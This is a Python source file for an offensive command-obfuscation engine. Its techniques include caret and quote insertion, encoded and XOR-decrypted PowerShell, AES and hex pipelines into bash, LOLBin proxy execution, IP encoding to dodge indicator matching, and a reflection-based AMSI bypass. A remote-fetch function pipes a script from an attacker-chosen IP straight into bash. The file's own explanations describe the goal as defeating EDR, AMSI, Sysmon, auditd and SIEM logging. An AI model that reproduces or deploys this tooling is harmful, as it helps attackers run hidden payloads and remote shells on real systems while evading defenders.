# Obfuscation engine — strategy functions and dispatcher.

import random
import string
import base64
import shlex
import re
from typing import Dict, Any, List, Optional


# ══════════════════════════════════════════════════════════════
# Helper utilities (Precision Evasion Logic)
# ══════════════════════════════════════════════════════════════

def _insert_quotes(word: str, quote_char: str = '"') -> str:
    """
    Insert empty-string quotes at random positions in a word.
    Guards environment variables like %VAR% and %TEMP% from being corrupted.
    """
    # If the word is an environment variable (e.g. %TEMP% or %SystemRoot%), do not corrupt it
    if word.startswith('%') and word.endswith('%'):
        return word

    if len(word) < 4:
        return word

    available = len(word) - 2
    num_inserts = random.randint(1, min(3, available))
    positions = sorted(
        random.sample(range(1, len(word) - 1), num_inserts),
        reverse=True,
    )
    chars = list(word)
    for pos in positions:
        chars.insert(pos, f'{quote_char}{quote_char}')
    return ''.join(chars)


def _insert_carets(word: str) -> str:
    """
    Insert caret (^) escape characters at random positions in Windows tokens.
    Guards environment variables like %SystemRoot% from breaking variable expansion.
    """
    if word.startswith('%') and word.endswith('%'):
        return word

    if len(word) < 3:
        return word

    available = len(word) - 2
    num_inserts = random.randint(1, min(3, available))
    positions = sorted(
        random.sample(range(1, len(word) - 1), num_inserts),
        reverse=True,
    )
    chars = list(word)
    for pos in positions:
        chars.insert(pos, '^')
    return ''.join(chars)


def _insert_ticks_powershell(word: str) -> str:
    """
    Insert PowerShell backtick (`) characters at random positions.
    Useful for breaking keyword signatures in PowerShell cmdlets (e.g. Inv`oke-WebR`equest).
    """
    if len(word) < 4:
        return word
    available = len(word) - 2
    num_inserts = random.randint(1, min(3, available))
    positions = sorted(
        random.sample(range(1, len(word) - 1), num_inserts),
        reverse=True,
    )
    chars = list(word)
    for pos in positions:
        chars.insert(pos, '`')
    return ''.join(chars)


def _env_var_substitute_windows(command: str) -> str:
    """
    Replace binary names with full %SystemRoot% environment-variable paths.
    Covers all 32+ Windows LOLBAS binaries.
    """
    substitutions = {
        "powershell": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell",
        "certutil":   "%SystemRoot%\\System32\\certutil",
        "bitsadmin":  "%SystemRoot%\\System32\\bitsadmin",
        "mshta":      "%SystemRoot%\\System32\\mshta",
        "regsvr32":   "%SystemRoot%\\System32\\regsvr32",
        "wmic":       "%SystemRoot%\\System32\\wbem\\wmic",
        "schtasks":   "%SystemRoot%\\System32\\schtasks",
        "curl":       "%SystemRoot%\\System32\\curl",
        "ftp":        "%SystemRoot%\\System32\\ftp",
        "reg":        "%SystemRoot%\\System32\\reg",
        "xcopy":      "%SystemRoot%\\System32\\xcopy",
        "msiexec":    "%SystemRoot%\\System32\\msiexec",
        "rundll32":   "%SystemRoot%\\System32\\rundll32",
        "esentutl":   "%SystemRoot%\\System32\\esentutl",
        "hh":         "%SystemRoot%\\hh",
        "cmstp":      "%SystemRoot%\\System32\\cmstp",
        "expand":     "%SystemRoot%\\System32\\expand",
        "certreq":    "%SystemRoot%\\System32\\certreq",
        "makecab":    "%SystemRoot%\\System32\\makecab",
        "netsh":      "%SystemRoot%\\System32\\netsh",
        "sc":         "%SystemRoot%\\System32\\sc",
    }

    for binary, expanded in substitutions.items():
        pattern = rf'\b{re.escape(binary)}(\.exe)?\b'
        if re.search(pattern, command, re.IGNORECASE):
            return re.sub(pattern, lambda m: expanded, command, count=1, flags=re.IGNORECASE)
    return command


def _case_flip(command: str) -> str:
    """
    Safely toggles character case in argument portions.
    Protects URLs (http://, https://), Base64 strings, and environment variables.
    """
    tokens = command.split(' ', 1)
    if len(tokens) == 1:
        return command
    binary, rest = tokens

    # Identify protected ranges (URLs, %VAR%, or strings in quotes)
    url_pattern = re.compile(r'https?://\S+')
    urls = list(url_pattern.finditer(rest))

    result_chars = []
    i = 0
    while i < len(rest):
        # Check if index is inside a URL
        in_url = False
        for match in urls:
            if match.start() <= i < match.end():
                result_chars.append(rest[i])
                in_url = True
                break
        if in_url:
            i += 1
            continue

        c = rest[i]
        if c.isalpha() and random.random() > 0.5:
            result_chars.append(c.upper() if c.islower() else c.lower())
        else:
            result_chars.append(c)
        i += 1

    return f"{binary} {''.join(result_chars)}"


def _split_string_powershell(command: str) -> str:
    """Split binary name into concatenated string literals wrapped in IEX."""
    tokens = command.split(' ', 1)
    if len(tokens) < 2:
        return command
    binary = tokens[0]
    rest = tokens[1]

    max_pos = max(1, len(binary) - 1)
    mid = random.randint(1, max_pos)
    b1, b2 = binary[:mid], binary[mid:]

    return f"powershell -c \"IEX(('{b1}' + '{b2}' + ' {rest}'))\""


def _base64_powershell(command: str) -> str:
    """Base64-encode the command for PowerShell -EncodedCommand (UTF-16LE)."""
    encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
    return f'powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}'


def _env_concat_linux(command: str) -> str:
    """Split binary name across shell variables and concatenate."""
    tokens = command.split(' ', 1)
    if len(tokens) < 2:
        return command
    binary, rest = tokens
    max_pos = max(1, len(binary) - 1)
    mid = random.randint(1, max_pos)
    var1 = ''.join(random.choices(string.ascii_lowercase, k=2))
    var2 = ''.join(random.choices(string.ascii_lowercase, k=2))
    return f'{var1}={binary[:mid]}; {var2}={binary[mid:]}; ${var1}${var2} {rest}'


def _base64_bash(command: str) -> str:
    """Base64-encode the full command and pipe through bash."""
    encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
    return f'echo {encoded} | base64 -d | bash'


def _hex_ip(command: str, ip: str) -> str:
    """Convert dotted-quad IP to hex representation (e.g. 192.168.1.1 -> 0xC0A80101)."""
    if not ip:
        return command
    try:
        parts = [int(o) for o in ip.split('.')]
        if len(parts) != 4 or not all(0 <= p <= 255 for p in parts):
            return command
        hex_ip = '0x' + ''.join(f'{p:02X}' for p in parts)
        return command.replace(ip, hex_ip)
    except (ValueError, AttributeError):
        return command


def _decimal_ip(command: str, ip: str) -> str:
    """Convert dotted-quad IP to decimal-long representation."""
    if not ip:
        return command
    try:
        parts = [int(o) for o in ip.split('.')]
        if len(parts) != 4 or not all(0 <= p <= 255 for p in parts):
            return command
        dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
        return command.replace(ip, str(dec))
    except (ValueError, AttributeError):
        return command


def _unicode_escape(command: str) -> str:
    """Apply partial URL percent-encoding to paths and keywords."""
    result = command
    replacements = [
        ('curl', 'cu%72l'),
        ('wget', 'w%67et'),
    ]
    for target, encoded in replacements:
        if target in result:
            result = result.replace(target, encoded, 1)

    def encode_path(match):
        path = match.group(2)
        if 'e' in path:
            path = path.replace('e', '%65', 1)
        elif 'a' in path:
            path = path.replace('a', '%61', 1)
        elif 'i' in path:
            path = path.replace('i', '%69', 1)
        return match.group(1) + path

    result = re.sub(r'(https?://[^\s/]+)(/\S+)', encode_path, result)
    return result


def _env_concat_plus_hex(command: str, ip: str) -> str:
    """Combined: split binary name via shell vars AND convert IP to hex."""
    obf = _env_concat_linux(command)
    if ip:
        obf = _hex_ip(obf, ip)
    return obf


def _reverse_string_bash(command: str) -> str:
    """Reverse command string and pipe through rev | bash with $'...' quoting."""
    reversed_cmd = command[::-1]
    safe = reversed_cmd.replace('\\', '\\\\').replace("'", "\\'")
    return f"echo $'{safe}' | rev | bash"


# ══════════════════════════════════════════════════════════════
# TIER 2 — ADVANCED TECHNIQUES (EDR, AMSI, Sysmon Bypasses)
# ══════════════════════════════════════════════════════════════

def _wmi_process_spawn(command: str) -> str:
    """Wrap command in WMI Win32_Process.Create() to break parent-child process trees."""
    safe = command.replace('"', '\\"')
    return f'wmic /node:127.0.0.1 process call create "{safe}"'


def _ps_securestring_decode(command: str) -> str:
    """Encode command via XOR + Base64, decrypted in-memory at runtime."""
    key = random.randint(1, 255)
    xor_bytes = bytes([b ^ key for b in command.encode('utf-16-le')])
    encoded = base64.b64encode(xor_bytes).decode('ascii')

    return (
        f"powershell -NoP -W Hidden -c \"$k={key};"
        f"$b=[Convert]::FromBase64String('{encoded}');"
        f"for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $k}};"
        f"IEX([System.Text.Encoding]::Unicode.GetString($b))\""
    )


def _stdin_pipe_cmd(command: str) -> str:
    """Pipe command into cmd.exe via stdin — Sysmon Event ID 1 shows zero arguments."""
    encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
    return (
        f'cmd /c "echo {encoded} > %TEMP%\\t.b64 && '
        f'certutil -decode %TEMP%\\t.b64 %TEMP%\\t.bat >nul 2>&1 && '
        f'cmd /s < %TEMP%\\t.bat && '
        f'del %TEMP%\\t.b64 %TEMP%\\t.bat"'
    )


def _forfiles_proxy(command: str) -> str:
    """Proxy execute command through signed Microsoft forfiles.exe."""
    safe = command.replace('"', '\\0x22')
    return f'forfiles /p %SystemRoot% /m notepad.exe /c "{safe}"'


def _multilayer_windows(command: str, ip: str) -> str:
    """4-Layer Combo: Env-var + Caret + Safe Case-flip + Hex IP."""
    obf = _env_var_substitute_windows(command)
    first_space = obf.find(' ')
    if first_space > 0:
        obf = _insert_carets(obf[:first_space]) + obf[first_space:]
    obf = _case_flip(obf)
    if ip:
        obf = _hex_ip(obf, ip)
    return obf


def _xxd_hex_decode(command: str) -> str:
    """Full hex encoding piped to xxd -r -p | bash."""
    hex_str = command.encode('utf-8').hex()
    return f"echo {hex_str} | xxd -r -p | bash"


def _bash_hex_escape(command: str) -> str:
    r"""Bash native $'\xNN' hex escape execution."""
    hex_chars = ''.join(f'\\x{b:02x}' for b in command.encode('utf-8'))
    return f"bash -c $'{hex_chars}'"


def _openssl_aes_pipe(command: str) -> str:
    """AES-256-CBC encrypted payload pipeline decrypted on-the-fly."""
    import os
    import hashlib
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend

        key_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        salt = os.urandom(8)
        key_iv = hashlib.pbkdf2_hmac('sha256', key_str.encode('utf-8'), salt, 10000, 32 + 16)
        aes_key, iv = key_iv[:32], key_iv[32:]

        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        pad_len = 16 - (len(command) % 16)
        padded = command.encode('utf-8') + bytes([pad_len]) * pad_len
        ciphertext = encryptor.update(padded) + encryptor.finalize()

        blob = b"Salted__" + salt + ciphertext
        encoded = base64.b64encode(blob).decode('ascii')

        return (
            f"export K={key_str}; echo '{encoded}' | base64 -d | "
            f"openssl enc -aes-256-cbc -a -d -salt -pass env:K -pbkdf2 -iter 10000 2>/dev/null | bash"
        )
    except ImportError:
        key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
        return (
            f"export K={key}; echo '{encoded}' | base64 -d | "
            f"openssl enc -aes-256-cbc -a -salt -pass env:K 2>/dev/null | "
            f"openssl enc -aes-256-cbc -a -d -salt -pass env:K 2>/dev/null | bash"
        )


def _multi_var_full_rebuild(command: str) -> str:
    """Split entire command across random variables with eval reconstruction."""
    chunk_size = random.randint(3, 5)
    chunks = [command[i:i+chunk_size] for i in range(0, len(command), chunk_size)]

    var_names = []
    assignments = []
    for chunk in chunks:
        vname = ''.join(random.choices(string.ascii_lowercase, k=3))
        while vname in var_names:
            vname = ''.join(random.choices(string.ascii_lowercase, k=3))
        var_names.append(vname)
        safe_chunk = chunk.replace("'", "'\\''")
        assignments.append(f"{vname}='{safe_chunk}'")

    expansion = ''.join(f'${v}' for v in var_names)
    return '; '.join(assignments) + f'; eval {expansion}'


def _awk_chr_reconstruct(command: str) -> str:
    """Reconstruct command character-by-character using awk numeric ASCII printf."""
    codes = ','.join(str(b) for b in command.encode('utf-8'))
    return (
        f"awk 'BEGIN{{split(\"{codes}\",a,\",\");"
        f"for(i=1;i<=length(a);i++)printf \"%c\",a[i]}}' | bash"
    )


def _perl_eval_exec(command: str) -> str:
    """Encode command as Perl pack() byte array executed via system()."""
    byte_list = ','.join(str(b) for b in command.encode('utf-8'))
    return f"perl -e 'system(pack(\"C*\",{byte_list}))'"


def _multilayer_linux(command: str, ip: str) -> str:
    """3-Layer Linux Cascade: Multi-var + Hex IP + Base64 Wrap."""
    obf = _multi_var_full_rebuild(command)
    if ip:
        obf = _hex_ip(obf, ip)
    return _base64_bash(obf)


# ══════════════════════════════════════════════════════════════
# TIER 3 — MODERN STEALTH INNOVATIONS
# ══════════════════════════════════════════════════════════════

def _ps_amsi_bypass(command: str) -> str:
    """
    Reflection-based in-memory AMSI patch + Base64 execution.
    Blinds AMSI before script block decoding without static string matches.
    """
    encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
    return (
        'powershell -NoP -W Hidden -c "'
        "$u=[string]::Join('',('System.Management.Automation.A','msiUtils'));"
        "$f=[string]::Join('',('am','siInit','Failed'));"
        "$a=[Ref].Assembly.GetType($u);"
        "$m=$a.GetField($f,'NonPublic,Static');"
        '$m.SetValue($null,$true);'
        f"$d=[Convert]::FromBase64String('{encoded}');"
        "$s=[Text.Encoding]::Unicode.GetString($d);"
        'IEX $s"'
    )


def _cmd_comma_separator(command: str) -> str:
    """
    Quote-aware argument separator substitution (commas/semicolons replace spaces).
    Defeats whitespace-based regex detection in EDR/SIEM.
    """
    try:
        tokens = shlex.split(command, posix=False)
    except ValueError:
        tokens = command.split(' ')

    if len(tokens) < 2:
        return command

    separators = [',', ';', ',']
    result = tokens[0]
    for i, token in enumerate(tokens[1:]):
        sep = separators[i % len(separators)]
        result += sep + token

    return f'cmd /c "{result}"'


def _ps_download_cradle(command: str, ip: str) -> str:
    """PowerShell XOR decryption loop with character-array IEX assembly."""
    key = random.randint(1, 255)
    xor_bytes = bytes([b ^ key for b in command.encode('utf-8')])
    encoded = base64.b64encode(xor_bytes).decode('ascii')

    return (
        f'powershell -NoP -W Hidden -c "'
        f'$k={key};'
        f"$e='{encoded}';"
        '$b=[Convert]::FromBase64String($e);'
        '$r=New-Object byte[] $b.Length;'
        'for($i=0;$i -lt $b.Length;$i++){$r[$i]=$b[$i] -bxor $k};'
        '$c=[Text.Encoding]::UTF8.GetString($r);'
        '$x=[char]73+[char]69+[char]88;'
        '.(([string]$x).ToLower()) $c"'
    )


def _double_b64_bash(command: str) -> str:
    """Double Base64 encoding pipeline."""
    inner = base64.b64encode(command.encode('utf-8')).decode('ascii')
    outer = base64.b64encode(inner.encode('utf-8')).decode('ascii')
    return f'echo {outer} | base64 -d | base64 -d | bash'


def _python_exec_wrapper(command: str) -> str:
    """Wrap command in trusted python3 os.system() base64 execution."""
    encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
    return (
        f"python3 -c \"import os,base64;"
        f"os.system(base64.b64decode('{encoded}').decode())\""
    )


def _wget_pipe_bash(command: str, ip: str, port: str = '') -> str:
    """Remote script fetch and execution pipeline with zero local payload args."""
    return f'wget -qO- http://{ip}:{port}/cmd 2>/dev/null | bash'


# ══════════════════════════════════════════════════════════════
# Technique Registry & Metadata
# ══════════════════════════════════════════════════════════════

TECHNIQUE_INFO: Dict[str, Dict[str, str]] = {
    # ── Windows Techniques ────────────────────────────────────
    'env_var': {
        'os': 'windows',
        'label': '%SystemRoot% env-var expansion + quote insertion + hex IP',
        'explain': (
            "Three combined evasions: (1) binary path expands to %SystemRoot% "
            "so bare binary strings never appear; (2) empty quotes ('\"\"') "
            "break signature strings; (3) dotted-quad IP is converted to hex."
        ),
    },
    'ps_iex': {
        'os': 'windows',
        'label': 'PowerShell IEX string-concat',
        'explain': (
            "Splits binary and cmdlet names across concatenated string literals "
            "and executes via Invoke-Expression (IEX), defeating naive static scans."
        ),
    },
    'ps_b64': {
        'os': 'windows',
        'label': 'PowerShell Base64 EncodedCommand',
        'explain': (
            "Encodes the command into UTF-16LE Base64 and executes via "
            "powershell -EncodedCommand, evading plaintext command-line logging."
        ),
    },
    'caret': {
        'os': 'windows',
        'label': 'Caret (^) insertion obfuscation',
        'explain': (
            "Inserts cmd.exe escape carets (^) that are transparently stripped "
            "at parse time, destroying static regex matches."
        ),
    },
    'quote': {
        'os': 'windows',
        'label': 'Quote-insertion obfuscation',
        'explain': (
            "Injects empty-string quote pairs into binary names. cmd.exe strips "
            "them during execution, but signature scanners fail to match."
        ),
    },
    'ps_tick': {
        'os': 'windows',
        'label': 'PowerShell backtick insertion',
        'explain': (
            "Inserts backticks (`) into PowerShell cmdlet names, evading "
            "signature rules while PowerShell parses them normally."
        ),
    },
    'wmi_spawn': {
        'os': 'windows',
        'label': 'WMI Win32_Process.Create() process-tree break',
        'explain': (
            "Spawns payload under WmiPrvSE.exe — breaks parent-child process "
            "tree heuristics and circumvents suspicious parent PID rules."
        ),
    },
    'ps_secure': {
        'os': 'windows',
        'label': 'PowerShell SecureString runtime decode → IEX',
        'explain': (
            "XOR + Base64 decrypts payload in-memory at runtime, keeping "
            "plaintext commands completely invisible to static script block scans."
        ),
    },
    'stdin_pipe': {
        'os': 'windows',
        'label': 'Stdin pipe — zero-argument cmd execution',
        'explain': (
            "Pipes commands into cmd.exe via stdin. Sysmon Event ID 1 "
            "logs show only 'cmd /s' with zero arguments."
        ),
    },
    'forfiles_proxy': {
        'os': 'windows',
        'label': 'forfiles.exe LOLBin execution proxy',
        'explain': (
            "Proxies execution via signed Microsoft forfiles.exe, "
            "making EDR trust the parent binary."
        ),
    },
    'multilayer_win': {
        'os': 'windows',
        'label': '4-layer cascade: env_var + caret + case_flip + hex_ip',
        'explain': (
            "Stacks %SystemRoot% path expansion, carets, safe case flipping, "
            "and hex IP conversion simultaneously."
        ),
    },
    'ps_amsi_bypass': {
        'os': 'windows',
        'label': 'AMSI bypass via reflection + Base64 execution',
        'explain': (
            "Blinds AMSI by setting amsiInitFailed via .NET reflection "
            "before executing Base64-decoded memory payload."
        ),
    },
    'cmd_comma_sep': {
        'os': 'windows',
        'label': 'cmd.exe comma/semicolon argument separator',
        'explain': (
            "Replaces argument whitespace with commas/semicolons, breaking "
            "whitespace-based command-line parsing in EDR and SIEM engines."
        ),
    },
    'ps_download_cradle': {
        'os': 'windows',
        'label': 'PowerShell char-array IEX + XOR decode cradle',
        'explain': (
            "Decodes XOR payload at runtime and constructs IEX via [char] "
            "codes, leaving zero scannable keywords in script text."
        ),
    },

    # ── Linux Techniques ──────────────────────────────────────
    'env_concat': {
        'os': 'linux',
        'label': 'Shell variable name concatenation',
        'explain': (
            "Splits binary name across shell variables ($a$b) to defeat "
            "real-time argument string inspections."
        ),
    },
    'hex_ip': {
        'os': 'both',
        'label': 'Hex IP encoding',
        'explain': (
            "Converts destination IP to hexadecimal (0xCOA80101) to bypass "
            "dotted-quad IOC matches."
        ),
    },
    'dec_ip': {
        'os': 'both',
        'label': 'Decimal-long IP encoding',
        'explain': (
            "Converts destination IP to 32-bit unsigned integer to evade IP IOCs."
        ),
    },
    'unicode': {
        'os': 'linux',
        'label': 'URL percent-encoding',
        'explain': (
            "Percent-encodes keywords and URL paths to defeat string match filters."
        ),
    },
    'b64_bash': {
        'os': 'linux',
        'label': 'Base64 encode → pipe to bash',
        'explain': (
            "Base64-encodes full command and pipes through base64 -d | bash, "
            "defeating auditd command-line logging."
        ),
    },
    'reverse': {
        'os': 'linux',
        'label': 'Reversed string → rev | bash',
        'explain': (
            "Reverses command string and reconstructs via rev | bash."
        ),
    },
    'env_concat_hex': {
        'os': 'linux',
        'label': 'Shell variable concat + hex IP (multi-layer)',
        'explain': (
            "Combines shell variable binary name splitting with hex IP conversion."
        ),
    },
    'xxd_hex': {
        'os': 'linux',
        'label': 'Full hex encoding → xxd -r -p → bash',
        'explain': (
            "Converts command to pure hexadecimal characters, rendering "
            "auditd and eBPF logs free of readable strings."
        ),
    },
    'bash_hex': {
        'os': 'linux',
        'label': r"Bash native $'\xNN' hex escape execution",
        'explain': (
            r"Uses native $'\xNN' escapes so process args contain only hex bytes."
        ),
    },
    'openssl_aes': {
        'os': 'linux',
        'label': 'AES-256-CBC encrypt → openssl decrypt → bash',
        'explain': (
            "Transfers encrypted ciphertext and decrypts on-the-fly via openssl."
        ),
    },
    'multi_var': {
        'os': 'linux',
        'label': 'Full-command N-variable rebuild → eval',
        'explain': (
            "Splits entire command into 3-5 character variables and executes via eval."
        ),
    },
    'awk_chr': {
        'os': 'linux',
        'label': 'awk printf ASCII-code reconstruction → bash',
        'explain': (
            "Rebuilds command character-by-character using decimal ASCII printf in awk."
        ),
    },
    'perl_eval': {
        'os': 'linux',
        'label': 'Perl pack() byte-array → system() eval',
        'explain': (
            "Executes command encoded as Perl byte array through system()."
        ),
    },
    'multilayer_lin': {
        'os': 'linux',
        'label': '3-layer cascade: multi_var + hex_ip + base64 wrap',
        'explain': (
            "Triple-layer cascade: multi-variable split, hex IP, and Base64 wrapping."
        ),
    },
    'double_b64': {
        'os': 'linux',
        'label': 'Double Base64 encoding → decode → decode → bash',
        'explain': (
            "Double-encodes payload to defeat automated single-pass base64 decoders."
        ),
    },
    'python_exec': {
        'os': 'linux',
        'label': 'python3 os.system() base64 wrapper',
        'explain': (
            "Executes base64 payload via trusted python3 interpreter."
        ),
    },
    'wget_pipe': {
        'os': 'linux',
        'label': 'wget remote script pipe to bash',
        'explain': (
            "Fetches remote script directly into bash execution pipeline."
        ),
    },
}


# ══════════════════════════════════════════════════════════════
# Public Dispatcher API
# ══════════════════════════════════════════════════════════════

def get_available_techniques(os_type: str = 'all') -> Dict[str, str]:
    """Return available technique identifiers and friendly labels for a given OS."""
    result = {}
    for key, info in TECHNIQUE_INFO.items():
        if os_type == 'all' or info['os'] == os_type or info['os'] == 'both':
            result[key] = info['label']
    return result


def obfuscate(command: str, os_type: str, binary: str,
              ip: str = '', technique: str = 'auto') -> Dict[str, str]:
    """
    Applies the selected (or intelligently auto-selected) obfuscation strategy.
    Returns dict containing: obfuscated_command, technique_used, explanation.
    """
    os_type = (os_type or 'windows').lower()
    technique = (technique or 'auto').lower()
    binary_lower = (binary or '').lower()

    # ── Windows Obfuscation Dispatch ──────────────────────────
    if os_type == 'windows':
        if technique == 'ps_b64':
            obf = _base64_powershell(command)
            key = 'ps_b64'
        elif technique == 'ps_tick':
            first_tok = command.split()[0]
            obf = _insert_ticks_powershell(first_tok) + command[len(first_tok):]
            key = 'ps_tick'
        elif technique == 'caret':
            first_tok = command.split()[0]
            obf = _insert_carets(first_tok) + command[len(first_tok):]
            if ip:
                obf = _hex_ip(obf, ip)
            key = 'caret'
        elif technique == 'wmi_spawn':
            obf = _wmi_process_spawn(command)
            key = 'wmi_spawn'
        elif technique == 'ps_secure':
            obf = _ps_securestring_decode(command)
            key = 'ps_secure'
        elif technique == 'stdin_pipe':
            obf = _stdin_pipe_cmd(command)
            key = 'stdin_pipe'
        elif technique == 'forfiles_proxy':
            obf = _forfiles_proxy(command)
            key = 'forfiles_proxy'
        elif technique == 'multilayer_win':
            obf = _multilayer_windows(command, ip)
            key = 'multilayer_win'
        elif technique == 'ps_amsi_bypass':
            obf = _ps_amsi_bypass(command)
            key = 'ps_amsi_bypass'
        elif technique == 'cmd_comma_sep':
            obf = _cmd_comma_separator(command)
            key = 'cmd_comma_sep'
        elif technique == 'ps_download_cradle':
            obf = _ps_download_cradle(command, ip)
            key = 'ps_download_cradle'
        elif technique == 'ps_iex' or ('powershell' in binary_lower and technique == 'auto'):
            obf = _split_string_powershell(command)
            key = 'ps_iex'
        elif technique == 'env_var' or technique == 'auto':
            obf = _env_var_substitute_windows(command)
            first_space = obf.find(' ')
            if first_space > 0:
                obf = _insert_quotes(obf[:first_space], '"') + obf[first_space:]
            if ip:
                obf = _hex_ip(obf, ip)
            key = 'env_var'
        else:
            # Fallback quote insertion
            first_tok = command.split()[0]
            obf = _insert_quotes(first_tok, '"') + command[len(first_tok):]
            key = 'quote'

    # ── Linux Obfuscation Dispatch ────────────────────────────
    else:
        if technique == 'b64_bash':
            obf = _base64_bash(command)
            key = 'b64_bash'
        elif technique == 'reverse':
            obf = _reverse_string_bash(command)
            key = 'reverse'
        elif technique == 'dec_ip' and ip:
            obf = _decimal_ip(command, ip)
            key = 'dec_ip'
        elif technique == 'unicode':
            obf = _unicode_escape(command)
            key = 'unicode'
        elif technique == 'env_concat':
            obf = _env_concat_linux(command)
            key = 'env_concat'
        elif technique == 'env_concat_hex':
            obf = _env_concat_plus_hex(command, ip)
            key = 'env_concat_hex'
        elif technique == 'hex_ip' and ip:
            obf = _hex_ip(command, ip)
            key = 'hex_ip'
        elif technique == 'xxd_hex':
            obf = _xxd_hex_decode(command)
            key = 'xxd_hex'
        elif technique == 'bash_hex':
            obf = _bash_hex_escape(command)
            key = 'bash_hex'
        elif technique == 'openssl_aes':
            obf = _openssl_aes_pipe(command)
            key = 'openssl_aes'
        elif technique == 'multi_var':
            obf = _multi_var_full_rebuild(command)
            key = 'multi_var'
        elif technique == 'awk_chr':
            obf = _awk_chr_reconstruct(command)
            key = 'awk_chr'
        elif technique == 'perl_eval':
            obf = _perl_eval_exec(command)
            key = 'perl_eval'
        elif technique == 'multilayer_lin':
            obf = _multilayer_linux(command, ip)
            key = 'multilayer_lin'
        elif technique == 'double_b64':
            obf = _double_b64_bash(command)
            key = 'double_b64'
        elif technique == 'python_exec':
            obf = _python_exec_wrapper(command)
            key = 'python_exec'
        elif technique == 'wget_pipe':
            obf = _wget_pipe_bash(command, ip)
            key = 'wget_pipe'
        else:
            # Smart context-aware auto selection for Linux
            if 'python' in binary_lower:
                obf = _python_exec_wrapper(command)
                key = 'python_exec'
            elif 'bash' in binary_lower or '/dev/tcp' in command:
                obf = _bash_hex_escape(command)
                key = 'bash_hex'
            elif ip:
                obf = _env_concat_plus_hex(command, ip)
                key = 'env_concat_hex'
            else:
                obf = _env_concat_linux(command)
                key = 'env_concat'

    info = TECHNIQUE_INFO.get(key, {
        'label': key,
        'explain': 'Applies dynamic evasion transformation.'
    })

    return {
        'obfuscated_command': obf,
        'technique_used': info['label'],
        'explanation': info['explain'],
    }